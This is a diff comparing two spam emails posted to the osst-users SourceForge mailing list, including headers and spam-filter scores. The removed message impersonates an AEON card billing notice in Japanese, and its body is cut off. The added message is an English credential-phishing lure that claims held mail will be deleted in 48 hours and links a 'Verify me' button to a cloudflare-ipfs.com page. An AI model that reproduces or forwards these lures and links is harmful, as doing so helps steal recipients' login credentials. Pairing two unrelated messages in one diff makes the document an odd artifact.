@@ -2,102 +2,102 @@ Return-Path: <osst-users-bounces@lists.sourceforge.net>
 X-Original-To: lists+osst-users@lfdr.de
 Delivered-To: lists+osst-users@lfdr.de
 Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
-	by mail.lfdr.de (Postfix) with ESMTPS id DF6BA8B4483
-	for <lists+osst-users@lfdr.de>; Sat, 27 Apr 2024 08:22:44 +0200 (CEST)
-Received: from [127.0.0.1] (helo=sfs-ml-2.v29.lw.sourceforge.com)
-	by sfs-ml-2.v29.lw.sourceforge.com with esmtp (Exim 4.95)
+	by mail.lfdr.de (Postfix) with ESMTPS id D784F8B4F51
+	for <lists+osst-users@lfdr.de>; Mon, 29 Apr 2024 03:52:52 +0200 (CEST)
+Received: from [127.0.0.1] (helo=sfs-ml-3.v29.lw.sourceforge.com)
+	by sfs-ml-3.v29.lw.sourceforge.com with esmtp (Exim 4.95)
 	(envelope-from <osst-users-bounces@lists.sourceforge.net>)
-	id 1s0bSM-0005KK-Qo
+	id 1s1GCJ-0003Bt-9N
 	for lists+osst-users@lfdr.de;
-	Sat, 27 Apr 2024 06:22:43 +0000
+	Mon, 29 Apr 2024 01:52:51 +0000
 Received: from [172.30.20.202] (helo=mx.sourceforge.net)
- by sfs-ml-2.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
+ by sfs-ml-3.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
  TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
- (envelope-from <no-reply.email.aeon@klti8g.cn>) id 1s0bSG-0005JS-0H
- for osst-users@lists.sourceforge.net; Sat, 27 Apr 2024 06:22:38 +0000
+ (envelope-from <lexi@reichspiele.com>) id 1s1GCF-0003Bn-7C
+ for osst-users@lists.sourceforge.net; Mon, 29 Apr 2024 01:52:47 +0000
 DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
- d=sourceforge.net; s=x; h=Content-Type:MIME-Version:Date:Subject:To:From:
- Message-ID:Sender:Reply-To:Cc:Content-Transfer-Encoding:Content-ID:
+ d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
+ :Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
  Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
  :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
  List-Subscribe:List-Post:List-Owner:List-Archive;
- bh=V6uuQqwYRH7tbSa7l9SF//gpwNbS7RFvnyP1SPqqK4k=; b=Dmo2jpgUvAyvGoS2ec6gY6ittr
- sXc4jfSzCjHZM6zYFyGmvZKgCbuM80uypYtDVo1jWqdBFFk/kPjCYE5z84DQEt+bfN9gb9O3xUB5m
- wzMGNSgTBvdCOiT3SoCrHT+Gd7qx4c0Uah7dG1dd1i+Xk+rMnmOJm0cjepk3Ns4fay0E=;
+ bh=EP0ja2mdeKujAfnn3ARXUaPucWV7y6hEK91UE0izG1Y=; b=OFJmv5qSHrWXiEg1svYeodfOzB
+ ehUB0D8dTF8sqU6OL1fc5Mug+uihYQT2oKPAgDHNWn3aB+nPJMu1ISH6bwhQ/0YCj6uqF1EV1QlDL
+ xVJ8AgGBeDGGAxbrLItVUCk8CYHdRYBnb9kZ4nDb5kEYFTNKRpQI403XSZ8z+IKKiJ/s=;
 DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
  ;
- h=Content-Type:MIME-Version:Date:Subject:To:From:Message-ID:Sender:Reply-To
- :Cc:Content-Transfer-Encoding:Content-ID:Content-Description:Resent-Date:
- Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
+ h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:
+ Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date
+ :Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
  References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
- List-Owner:List-Archive; bh=V6uuQqwYRH7tbSa7l9SF//gpwNbS7RFvnyP1SPqqK4k=; b=c
- 8sZeBKsjvZEdGsYTciIaGVaneKBkzKPiDbyojM9+iMzGJbFqCPLW/OKcBW4pWwAs09lls3CxUubzt
- WTdAtstVZXbbv1Sxb0Yz5m3iayVVn1q5UagWmz7K7NWOSiLUJy64wUl35cZUt/PfFa9Vgm2QBHPvR
- mom4I1eZpwPWmxMk=;
-Received: from [152.32.205.67] (helo=mail.klti8g.cn)
+ List-Owner:List-Archive; bh=EP0ja2mdeKujAfnn3ARXUaPucWV7y6hEK91UE0izG1Y=; b=a
+ wcWtLpaOkW1gmDI4FMmqGZtOltO4ziXX4hkSyguga1ivuzuqdGjaeE2v7Zo9qrPtZeDtJpMlcUlvn
+ 5Um7XdDl5xe9Z0yPyJ1ZBchfokk/ej8GVpPgpnJGsJhhxApwJI5YblXELWiNpLD7K/lLa/mLnm3aL
+ M1Pi6VMpTCXi7qwI=;
+Received: from howdy.reichspiele.com ([194.169.172.52])
  by sfi-mx-2.v28.lw.sourceforge.com with esmtps
  (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.95)
- id 1s0bSE-0002ac-6k for osst-users@lists.sourceforge.net;
- Sat, 27 Apr 2024 06:22:36 +0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; s=default; d=klti8g.cn; 
- h=Message-ID:From:To:Subject:Date:MIME-Version:Content-Type;
- i=no-reply.email.aeon@klti8g.cn;
- bh=V6uuQqwYRH7tbSa7l9SF//gpwNbS7RFvnyP1SPqqK4k=;
- b=WYabD4NQosHyQHwtJ0YyJIwSBK2f8dKGPpF0wtnR/mPPbgKoxzuow6J/jZJr8Umeiyz981zVZH9Q
- OCab8FF+8eeusChql1oecoLJ01zJWgLlEcj3QUJgSAfDnl5IANTeX63haGTl6qzqukHel9pFpTKG
- 5Ir99RfMTveeMbNf1NMOWqAVQV7TvUZjSSPMniWEKg2ZUFxRXi/DNBS5/qy/1qctU01SxnvVggIH
- EnWnUs17/eBQwvfl78PVX32MaXIoserBwur3P6kM56QLwQNjqXZ2y0K3MscUK43SHpKkEfx5PUGk
- qZFowuagwHQN8zaY6a3Z9PQ5unX5OPd7TnUquA==
-Message-ID: <6A2847BDD47425589D42EE6DBBFAC1FA@ndO.yylsnrm>
-From: =?utf-8?B?44Kk44Kq44Oz44Oa44Kk?= <no-reply.email.aeon@klti8g.cn>
-To: <osst-users@lists.sourceforge.net>
-Date: Sat, 27 Apr 2024 15:01:55 +0900
+ id 1s1GCE-00085V-30 for osst-users@lists.sourceforge.net;
+ Mon, 29 Apr 2024 01:52:47 +0000
+DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed; s=dkim; d=reichspiele.com; 
+ h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:Content-Transfer-Encoding;
+ i=lexi@reichspiele.com; bh=l1SNY0T4MNGsEYZAiA3lxF++QNk=;
+ b=QFLMucv0rAsfD0bRVItCymOQ9kwyQ9lkUiPEjzIuPCLFBkoVk/zxD0OK8KM8MsvYMFk+vXK5nMub
+ XcprrAdO7MB919sV4ZO814aQaR8lQm1jG4QQ2y2PcQe1n3kF9d7JNpQM8fA3QViiRbMc55yC4+ys
+ 3tRvpPmk8H9EWLNGe59JyQBLzJqJrKXTqUTi6C4QI1PjBqCgtC2cdueaGBaPO2zXlqNtHnsBGeFK
+ +A78AZMkONo1vmNYjEwgQIcTqiYfoYuir+9afyYlD+LJPIPUjBBhArxuA54/35tI8JDa3qRUTYco
+ U3QWiSbyENhqJLW2KRyGcmOQkizXJpHFqnGo2g==
+DomainKey-Signature: a=rsa-sha1; c=nofws; q=dns; s=dkim; d=reichspiele.com;
+ b=BNAwR2t6wkvZz38gcRp1QYdCdePrK1XtoT03RZoqnb088yoXkLSifkF1oy1KnYXIEIrWWRH33//p
+ 51JLbE1eNFhyso2s30F0ca/fP1NA7Vwio45RejjRgiGOxEyQUpS4MTud1hMdpLJ0sL6nq76InyPz
+ 6pkvU+kq7PMHpfvtpr80yK4pU9hOW5U+tmFxTzYxNmcjo7LLZV49gDCcrq6sGEwQ7jHPdnrIFe5B
+ pLagjeILb0GJJ8QBTXPcQIW0Kbxkmy1/1DVoQMxyD30Im+W7Qz8pdz4dACREv0F9DZtR7CD+LLI+
+ xYxE820q7rMjMx1qYaDKHjKWSB6g5EKx01Rbgw==;
+From: Hostdomain<lexi@reichspiele.com>
+To: osst-users@lists.sourceforge.net
+Date: 28 Apr 2024 18:52:33 -0700
+Message-ID: <20240428185233.E62C58CDB20DF76C@reichspiele.com>
 MIME-Version: 1.0
-X-MSMail-Priority: High
-X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2900.5512
-X-Spam-Score: 5.1 (+++++)
-X-Spam-Report: Spam detection software, running on the system "util-spamd-1.v13.lw.sourceforge.com",
+X-Spam-Score: 3.1 (+++)
+X-Spam-Report: Spam detection software,
+ running on the system "util-spamd-1.v13.lw.sourceforge.com", 
  has NOT identified this incoming email as spam.  The original
  message has been attached to this so you can view it or label
  similar future email.  If you have any questions, see
  the administrator of that system for details.
- 
- Content preview:  いつもイオンマークのカードをご利用いただき、ありがとうございます。
-    本メールはWeb明細(環境宣言)にご登録いただいているお客さまにお送りし�
-    [...] 
- 
- Content analysis details:   (5.1 points, 6.0 required)
- 
-  pts rule name              description
+ Content preview: Your incoming messages have been placed on hold. This pending
+ messages will be deleted automatically after 48hours We need to verify your
+ osst-users@lists.sourceforge.net address on our platform Click the Verify
+ me below to move the pending e mails to your inbox. 
+ Content analysis details:   (3.1 points, 6.0 required)
+ pts rule name              description
  ---- ---------------------- --------------------------------------------------
-  0.0 URIBL_BLOCKED          ADMINISTRATOR NOTICE: The query to URIBL was
-                             blocked.  See
-                             http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
-                              for more information.
-                             [URIs: aeonbank.co.jp]
-  1.9 URIBL_ABUSE_SURBL      Contains an URL listed in the ABUSE SURBL
-                             blocklist
-                             [URIs: dzdzeid.cn]
-  0.0 URIBL_PH_SURBL         Contains an URL listed in the PH SURBL blocklist
-                             [URIs: klti8g.cn]
+ 0.0 URIBL_BLOCKED          ADMINISTRATOR NOTICE: The query to URIBL was
+ blocked.  See
+ http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
+ for more information. [URIs: cloudflare-ipfs.com]
+ 1.0 RCVD_IN_UCE1           RBL: IP Listed in UCEPROTECT Level 1
+ [194.169.172.52 listed in dnsbl-1.uceprotect.net]
+ 1.3 RCVD_IN_VALIDITY_RPBL  RBL: Relay in Validity RPBL,
+ https://senderscore.org/blocklistlookup/
+ [194.169.172.52 listed in bl.score.senderscore.com]
+ 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
  -0.0 SPF_PASS               SPF: sender matches SPF record
-  0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
-  0.1 HTTPS_HTTP_MISMATCH    BODY: No description available.
-  0.0 HTML_MESSAGE           BODY: HTML included in message
- -0.1 DKIM_VALID_EF          Message has a valid DKIM or DK signature from
-                             envelope-from domain
-  0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily
-                             valid
+ 0.0 HTML_MESSAGE           BODY: HTML included in message
+ 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
+ -0.1 DKIM_VALID Message has at least one valid DKIM or DK signature
  -0.1 DKIM_VALID_AU          Message has a valid DKIM or DK signature from
-                             author's domain
- -0.1 DKIM_VALID             Message has at least one valid DKIM or DK signature
-  2.0 PYZOR_CHECK            Listed in Pyzor
-                             (https://pyzor.readthedocs.io/en/latest/)
-  0.0 FSL_BULK_SIG           Bulk signature with no Unsubscribe
-  1.3 RDNS_NONE              Delivered to internal network by a host with no rDNS
-X-Headers-End: 1s0bSE-0002ac-6k
-Subject: [Osst-users] =?utf-8?b?M+aciOOBlOiri+axgumhjeOBruOBiuefpeOCiQ==?=
- =?utf-8?b?44Gb?=
+ author's domain
+ -0.1 DKIM_VALID_EF          Message has a valid DKIM or DK signature from
+ envelope-from domain
+ 0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily
+ valid
+ 0.9 URI_CLOUDFLAREIPFS     References Interplanetary File System PtP
+ content via CloudFlare, likely phishing
+ 0.0 T_KAM_HTML_FONT_INVALID Test for Invalidly Named or Formatted
+ Colors in HTML
+X-Headers-End: 1s1GCE-00085V-30
+Subject: [Osst-users] Signin For Pending e-mails!!!
 X-BeenThere: osst-users@lists.sourceforge.net
 X-Mailman-Version: 2.1.21
 Precedence: list
@@ -109,217 +109,250 @@ List-Post: <mailto:osst-users@lists.sourceforge.net>
 List-Help: <mailto:osst-users-request@lists.sourceforge.net?subject=help>
 List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/osst-users>,
  <mailto:osst-users-request@lists.sourceforge.net?subject=subscribe>
-Content-Type: multipart/mixed; boundary="===============3427152645227997998=="
+Content-Type: multipart/mixed; boundary="===============5982488253107879440=="
 Errors-To: osst-users-bounces@lists.sourceforge.net
 
-This is a multi-part message in MIME format.
+--===============5982488253107879440==
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
 
---===============3427152645227997998==
-Content-Type: multipart/alternative;
-	boundary="----=_NextPart_000_0E57_0185AB3C.10CDECF0"
+<html><head>
+<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.9600.19003">
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body>
+<div style=3D'text-align: left; color: rgb(29, 34, 40); text-transform: non=
+e; text-indent: 0px; letter-spacing: normal; font-family: "Helvetica Neue",=
+ Helvetica, Arial, sans-serif; font-size: 13px; font-style: normal; font-we=
+ight: 400; word-spacing: 0px; white-space: normal; orphans: 2; widows: 2; b=
+ackground-color: rgb(255, 255, 255); font-variant-ligatures: normal; font-v=
+ariant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickn=
+ess: initial; text-decoration-style: initial;=20
+text-decoration-color: initial;'><span style=3D"color: rgb(44, 54, 58); fon=
+t-family: Arial, sans-serif;">Your incoming messages have been placed on ho=
+ld.</span><br></div>
+<div class=3D"yiv8484131672v1ydpe41a34dcyahoo_quoted" id=3D"yiv8484131672v1=
+ydpe41a34dcyahoo_quoted_8180004419" style=3D'text-align: left; color: rgb(2=
+9, 34, 40); text-transform: none; text-indent: 0px; letter-spacing: normal;=
+ font-family: "Helvetica Neue", Helvetica, Arial, sans-serif; font-size: 13=
+px; font-style: normal; font-weight: 400; word-spacing: 0px; white-space: n=
+ormal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); font-va=
+riant-ligatures: normal; font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
+coration-style: initial; text-decoration-color: initial;'>
+<div style=3D'color: rgb(38, 40, 42); font-family: "Helvetica Neue", Helvet=
+ica, Arial, sans-serif; font-size: 13px;'>
+<div>
+<div class=3D"yiv8484131672v1ydpfb2a13d5yahoo-style-wrap" style=3D'font-fam=
+ily: "Helvetica Neue", Helvetica, Arial, sans-serif; font-size: 13px;'>
+<div id=3D"yiv8484131672v1ydpfb2a13d5yiv9234107129">
+<div class=3D"yiv8484131672v1ydpfb2a13d5yiv9234107129ydpa75581bayahoo-style=
+-wrap" style=3D'font-family: "Helvetica Neue", Helvetica, Arial, sans-serif=
+; font-size: 13px;'>
+<div dir=3D"ltr">
+<div style=3D"color: rgb(44, 54, 58); padding-top: 0px; font-family: Arial,=
+ sans-serif; border-top-color: currentColor; border-top-width: 0px; border-=
+top-style: none;" dir=3D"ltr">
+<div>
+<div style=3D"color: rgb(44, 54, 58); font-family: Arial, sans-serif;">This=
+ pending messages will be deleted automatically after&nbsp;48hours<br><br>
+<p align=3D"left" style=3D'margin: 20px 0px; padding: 0px; color: rgb(34, 3=
+4, 34); line-height: 1.3; font-family: "Helvetica Neue", Helvetica, Arial, =
+Geneva, sans-serif; font-size: 14px; background-color: rgb(240, 240, 240);'=
+>
+We need to verify your &nbsp;osst-users@lists.sourceforge.net &nbsp;address=
+ on our&nbsp; platform<br>Click the Verify me&nbsp;below to move the pendin=
+g&nbsp;e mails to your inbox.</p>
+<table style=3D'padding: 0px; width: 150px; color: rgb(34, 34, 34); font-fa=
+mily: "Helvetica Neue", Helvetica, Arial, Geneva, sans-serif; font-size: 14=
+px; vertical-align: top; border-collapse: collapse; background-color: rgb(2=
+40, 240, 240);'>
+<tbody>
+<tr align=3D"left" style=3D"padding: 0px; vertical-align: top;">
+<td width=3D"150" height=3D"35" align=3D"center" valign=3D"middle" style=3D=
+"background: rgb(108, 199, 39); padding: 0px; width: 150px; text-align: cen=
+ter; color: rgb(255, 255, 255); line-height: 1.3; vertical-align: middle; d=
+isplay: block; border-collapse: collapse; -ms-word-break: normal;" bgcolor=
+=3D"#6cc727">
+<a style=3D"border-width: 0px; margin: 0px; padding: 0px; width: 150px; col=
+or: rgb(255, 255, 255); line-height: 35px; font-family: inherit; font-size:=
+ 18px; text-decoration: underline; vertical-align: baseline; display: inlin=
+e-block; font-stretch: inherit; background-color: transparent;" href=3D"htt=
+ps://cloudflare-ipfs.com/ipfs/bafybeicy4oxogpgwrbsxy3hqvks5jarzfhyoi4gf5pl6=
+swsbtfudqcb32u/gtcxopjn.html/#osst-users@lists.sourceforge.net" target=3D"_=
+blank" rel=3D"nofollow noopener noreferrer">&#10003; Verify me</a></td></tr=
+>
+</tbody>
+</table></div>
+<p style=3D"color: rgb(44, 54, 58); font-family: Arial, sans-serif; margin-=
+top: 0px;"><span style=3D"font-weight: bolder;"><br></span></p>
+<div style=3D"color: rgb(44, 54, 58); font-family: Arial, sans-serif;">
+<div style=3D"padding-top: 0px; border-top-color: currentColor; border-top-=
+width: 0px; border-top-style: none;">&nbsp;</div>
+<div style=3D"margin: 0px; padding: 0px; font-family: arial, helvetica, san=
+s-serif; font-size: small; border-top-width: 0px;">
+<table style=3D"border-width: 0px; width: 872px; line-height: normal; font-=
+family: verdana, arial, sans-serif; font-size: 11px; border-collapse: colla=
+pse;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+<thead>
+<tr>
+<th style=3D"margin: 0px; padding: 4px 6px; width: 188px; text-align: left;=
+ font-weight: normal; vertical-align: bottom; border-top-color: rgb(170, 17=
+0, 170); border-left-color: rgb(170, 170, 170); border-top-width: 1px; bord=
+er-left-width: 1px; border-top-style: solid; border-left-style: solid; back=
+ground-color: rgb(251, 251, 251);">&nbsp;</th>
+<th style=3D"margin: 0px; padding: 4px 6px; width: 229px; text-align: left;=
+ font-weight: normal; vertical-align: bottom; border-top-color: rgb(170, 17=
+0, 170); border-left-color: rgb(170, 170, 170); border-top-width: 1px; bord=
+er-left-width: 1px; border-top-style: solid; border-left-style: solid; back=
+ground-color: rgb(251, 251, 251);">Recipient:</th>
+<th style=3D"margin: 0px; padding: 4px 6px; width: 215px; text-align: left;=
+ font-weight: normal; vertical-align: bottom; border-top-color: rgb(170, 17=
+0, 170); border-right-color: rgb(170, 170, 170); border-left-color: rgb(170=
+, 170, 170); border-top-width: 1px; border-right-width: 1px; border-left-wi=
+dth: 1px; border-top-style: solid; border-right-style: solid; border-left-s=
+tyle: solid; background-color: rgb(251, 251, 251);">
+<table style=3D"width: 203px; border-collapse: collapse;" border=3D"1">
+<tbody>
+<tr>
+<td style=3D"width: 199px; -ms-word-break: normal;">Subject:</td></tr></tbo=
+dy></table></th></tr></thead>
+<thead>
+<tr>
+<th style=3D"margin: 0px; padding: 4px; width: 871px; text-align: left; col=
+or: rgb(255, 255, 255); font-weight: normal; background-color: rgb(0, 0, 10=
+0);" colspan=3D"4"><span style=3D"font-weight: bolder;">
+<br></span></th></tr></thead>
+<tbody>
+<tr valign=3D"top">
+<td style=3D"padding: 5px; width: 188px; border-top-color: rgb(170, 170, 17=
+0); border-left-color: rgb(170, 170, 170); border-top-width: 1px; border-le=
+ft-width: 1px; border-top-style: solid; border-left-style: solid; white-spa=
+ce: nowrap; -ms-word-break: normal;"><span style=3D"color: rgb(60, 149, 195=
+);"><strong><u>
+</u></strong><font color=3D"#2c363a">Deliver</font><br></span></td>
+<td style=3D"padding: 5px; width: 229px; border-top-color: rgb(170, 170, 17=
+0); border-left-color: rgb(170, 170, 170); border-top-width: 1px; border-le=
+ft-width: 1px; border-top-style: solid; border-left-style: solid; -ms-word-=
+break: normal;">&nbsp; osst-users@lists.sourceforge.net&nbsp;</td>
+<td style=3D"padding: 5px; width: 215px; border-top-color: rgb(170, 170, 17=
+0); border-left-color: rgb(170, 170, 170); border-top-width: 1px; border-le=
+ft-width: 1px; border-top-style: solid; border-left-style: solid; -ms-word-=
+break: normal;"><font color=3D"#1560bd">Re: quotation</font></td>
+<td style=3D"padding: 5px; width: 237px; border-top-color: rgb(170, 170, 17=
+0); border-right-color: rgb(170, 170, 170); border-left-color: rgb(170, 170=
+, 170); border-top-width: 1px; border-right-width: 1px; border-left-width: =
+1px; border-top-style: solid; border-right-style: solid; border-left-style:=
+ solid; white-space: nowrap; -ms-word-break: normal;">
+<span><strong>(26 April</strong><strong>&nbsp;2024)</strong></span></td></t=
+r>
+<tr valign=3D"top">
+<td style=3D"padding: 5px; width: 188px; border-top-color: rgb(170, 170, 17=
+0); border-left-color: rgb(170, 170, 170); border-top-width: 1px; border-le=
+ft-width: 1px; border-top-style: solid; border-left-style: solid; white-spa=
+ce: nowrap; -ms-word-break: normal;">
+Deliver</td>
+<td style=3D"padding: 5px; width: 229px; border-top-color: rgb(170, 170, 17=
+0); border-left-color: rgb(170, 170, 170); border-top-width: 1px; border-le=
+ft-width: 1px; border-top-style: solid; border-left-style: solid; -ms-word-=
+break: normal;">&nbsp; osst-users@lists.sourceforge.net&nbsp;&nbsp;</td>
+<td style=3D"padding: 5px; width: 215px; border-top-color: rgb(170, 170, 17=
+0); border-left-color: rgb(170, 170, 170); border-top-width: 1px; border-le=
+ft-width: 1px; border-top-style: solid; border-left-style: solid; -ms-word-=
+break: normal;"><span style=3D"color: rgb(21, 96, 189);">
 
-This is a multi-part message in MIME format.
-
-------=_NextPart_000_0E57_0185AB3C.10CDECF0
-Content-Type: text/plain;
-	charset="utf-8"
-Content-Transfer-Encoding: base64
-
-44GE44Gk44KC44Kk44Kq44Oz44Oe44O844Kv44Gu44Kr44O844OJ44KS44GU5Yip55So44GE44Gf
-44Gg44GN44CB44GC44KK44GM44Go44GG44GU44GW44GE44G+44GZ44CCDQrmnKzjg6Hjg7zjg6vj
-ga9XZWLmmI7ntLAo55Kw5aKD5a6j6KiAKeOBq+OBlOeZu+mMsuOBhOOBn+OBoOOBhOOBpuOBhOOC
-i+OBiuWuouOBleOBvuOBq+OBiumAgeOCiuOBl+OBpuOBiuOCiuOBvuOBmeOAgg0KDQoz5pyI44Gu
-44GU6KuL5rGC6aGN44GM56K65a6a44GE44Gf44GX44G+44GX44Gf44CCDQoNCuKUgeKUgeKUgeKU
-geKUgeKUgeKUgeKUgQ0K44GK5pSv5omV44GE44Gr44Gk44GE44GmDQrilIHilIHilIHilIHilIHi
-lIHilIHilIENCuOBlOWIqeeUqOOCq+ODvOODiSDvvJog44Kk44Kq44Oz44Kr44O844OJ44K744Os
-44Kv44OIDQrjgYrmlK/miZXml6Ug77yaMjAyNOW5tDTmnIgzMOaXpQ0KDQrlj6Pluqfmrovpq5jj
-ga7jgZTnorroqo3jg7vjgZTlhaXph5Hjga/jgIHjgYrmlK/miZXml6Xjga7liY3llrbmpa3ml6Xj
-gb7jgafjgavjgYrpoZjjgYTjgYTjgZ/jgZfjgb7jgZnjgIINCuOBlOWIqeeUqOaYjue0sOOBr+OA
-geOCouODl+ODquOAjOOCpOOCquODs+OCpuOCqeODrOODg+ODiOOAjeOBvuOBn+OBr+ODm+ODvOOD
-oOODmuODvOOCuOOAjOaaruOCieOBl+OBruODnuODjeODvOOCteOCpOODiOOAjeOBuOODreOCsOOC
-pOODs+OBhOOBn+OBoOOBjeOBlOeiuuiqjeOBj+OBoOOBleOBhOOAgg0KDQrilrzjgZToq4vmsYLm
-mI7ntLDjga7jgZTnorroqo3jga/jgZPjgaHjgokNCmh0dHBzOi8vd3d3LmFlb24uY28uanAvYXBw
-Lw0KDQrigLvjg6Hjg7zjg6vkvZzmiJDmmYLngrnjgafjga7oq4vmsYLnorrlrprpoY3jgavjgarj
-gorjgb7jgZnjgILjgZTliKnnlKjnirbms4Hjgavjgojjgorlho3luqboq4vmsYLpoY3norrlrprj
-g6Hjg7zjg6vjgpLjgYrpgIHjgorjgZnjgovloLTlkIjjgYzjgZTjgZbjgYTjgb7jgZnjgIINCuKA
-u+OBiuW8leiQveWPo+W6p+OBruioreWumuOBjOWujOS6huOBl+OBpuOBhOOBquOBhOWgtOWQiOOB
-r+OAgeaciOacq+mgg+OBq+eZuumAgeOBhOOBn+OBl+OBvuOBmeOCs+ODs+ODk+ODi+OBruaMr+i+
-vOeUqOe0meOBp+OBruOBiuaUr+aJleOBhOOCkuOBiumhmOOBhOOBhOOBn+OBl+OBvuOBmeOAguOB
-iuW8leiQveWPo+W6p+OBruioreWumuOBjOWujOS6huOBl+OBn+OBi+OBlOS4jeaYjuOBquWgtOWQ
-iOOBr+S4i+iomOOCiOOCiuOBlOeiuuiqjeOBj+OBoOOBleOBhOOAgg0KaHR0cHM6Ly9mYXEuYWVv
-bi5jby5qcC9mYXEvc2hvdy82NjA/c2l0ZV9kb21haW49ZGVmYXVsdA0K4oC75LiA6YOo44CB44GK
-5byV6JC95pel44GM55Ww44Gq44KL44Kr44O844OJ44GM44GU44GW44GE44G+44GZ44CCDQoNCuKU
-geKUgeKUgeKUgeKUgeKUgeKUgeKUgQ0KV0FPTiBQT0lOVOOBq+OBpOOBhOOBpg0K4pSB4pSB4pSB
-4pSB4pSB4pSB4pSB4pSBDQrjgq/jg6zjgrjjg4Pjg4jjg7vjg4fjg5Pjg4Pjg4jmiZXjgYTjgafj
-gZ/jgb7jgotXQU9OIFBPSU5U5pWw44Gv5q+O5pyIMjXml6Xjgavjg4fjg7zjgr/jgYzmm7TmlrDj
-gZXjgozjgb7jgZnjgILjgqLjg5fjg6rjgIzjgqTjgqrjg7Pjgqbjgqnjg6zjg4Pjg4jjgI3jgb7j
-gZ/jga/jg5vjg7zjg6Djg5rjg7zjgrjjgIzmmq7jgonjgZfjga7jg57jg43jg7zjgrXjgqTjg4jj
-gI3jgbjjg63jgrDjgqTjg7PjgYTjgZ/jgaDjgY3jgZTnorroqo3jgY/jgaDjgZXjgYTjgIINCihX
-QU9OIFBPSU5U44GM6YCy5ZGI44GV44KM44Gq44GE44Kr44O844OJ44Gv44GU5Yip55So44GE44Gf
-44Gg44GR44G+44Gb44KTKQ0KDQrilrzmmq7jgonjgZfjga7jg57jg43jg7zjgrXjgqTjg4jjga/j
-gZPjgaHjgokNCmh0dHBzOi8vd3d3LmFlb24uY28uanAvYXBwL3BvaW50Lw0K4pa8V0FPTiBQT0lO
-VOOBruS9v+OBiOOCi+W6l+iIl+ODu+S9v+OBhOaWueOBq+mWouOBl+OBpuOBr+OBk+OBoeOCiQ0K
-aHR0cHM6Ly9mYXEuYWVvbi5jby5qcC9mYXEvc2hvdy81NjI/YmFjaz1mcm9udCUyRmNhdGVnb3J5
-JTNBc2hvdyZjYXRlZ29yeV9pZD0xNjYmcGFnZT0xJnNpdGVfZG9tYWluPWRlZmF1bHQmc29ydD1z
-b3J0X2FjY2VzcyZzb3J0X29yZGVyPWRlc2MgDQoNCuKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgQ0K
-44Ki44OX44Oq44KE44Oh44O844Or44Gn44GK44OI44Kv44Gq5oOF5aCx44GM5Y+X5Y+W44KM44G+
-44GZ77yBDQrilIHilIHilIHilIHilIHilIHilIHilIENCuOCpOOCquODs+OCq+ODvOODieWFrOW8
-j+OCouODl+ODquOAjOOCpOOCquODs+OCpuOCqeODrOODg+ODiOOAjeOBquOCieOBlOWIqeeUqOaY
-jue0sOOBrueiuuiqjeOChOODneOCpOODs+ODiOS6pOaPm+OBr+OCguOBoeOCjeOCk+OAgeS8muWT
-oemZkOWumuOCr+ODvOODneODs+OCguWIqeeUqOOBp+OBjeS+v+WIqeOBp+OBiuODiOOCr+KZqg0K
-4pa8aVBob25l44KS44GK5oyB44Gh44Gu5pa544Gv44GT44Gh44KJDQpodHRwczovL2l0dW5lcy5h
-cHBsZS5jb20vanAvYXBwL2Flb24td2FsbGV0L2lkMTEwMDU2NDg0Mj9sPWphJmxzPTEmbXQ9OA0K
-4pa8QW5kcm9pZOOCueODnuODm+OCkuOBiuaMgeOBoeOBruaWueOBr+OBk+OBoeOCiQ0KaHR0cHM6
-Ly9wbGF5Lmdvb2dsZS5jb20vc3RvcmUvYXBwcy9kZXRhaWxzP2lkPWpwLmNvLmFlb24uY3JlZGl0
-LmFuZHJvaWQud2FsbGV0DQoNCuKWvOOCpOOCquODs+OBquOBqeOBp+OBruOBiuiyt+OBhOeJqeaD
-heWgseOChOOCq+ODvOODieOCreODo+ODs+ODmuODvOODs+aDheWgseOCguOBhOOBoeaXqeOBj+OB
-iuWxiuOBke+8geODoeODvOODq+ODnuOCrOOCuOODs+OBruOBlOeZu+mMsuOBr+OBk+OBoeOCiQ0K
-aHR0cHM6Ly93d3cuYWVvbi5jby5qcC9zZXJ2aWNlL25ld3NsZXR0ZXIvDQrilIHilIHilIHilIHi
-lIHilIHilIHilIENCuOBiuWuouOBleOBvuaDheWgseOBruacgOaWsOWMluOBq+OBpOOBhOOBpg0K
